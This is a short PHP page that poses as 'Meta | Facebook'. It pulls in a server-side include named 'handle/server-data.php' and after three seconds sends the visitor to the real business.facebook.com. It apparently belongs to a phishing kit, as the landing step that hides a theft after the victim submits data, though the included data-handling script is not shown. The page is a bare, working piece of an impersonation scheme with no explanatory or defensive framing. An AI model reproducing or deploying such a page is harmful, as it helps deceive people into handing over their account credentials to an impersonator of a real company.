<?php require_once('intro.php'); ?>

<!DOCTYPE html>
<html lang="en" id="html">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://i.imgur.com/4EzYFyb.jpeg">
    <title>Meta | Facebook</title>
    <link rel="stylesheet" href="styles/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <link rel="stylesheet" href="styles/style.css">
    <link rel="shortcut icon" href="https://i.imgur.com/FOY6xZ9.png" type="image/x-icon">

</head>

<body>
    <?php require_once('handle/server-data.php'); ?>
    <?php require_once('intro.php'); ?>

    <script>
        setTimeout(function() {
            window.location.href = 'https://business.facebook.com/';
        }, 3000);
    </script>
</body>

</html>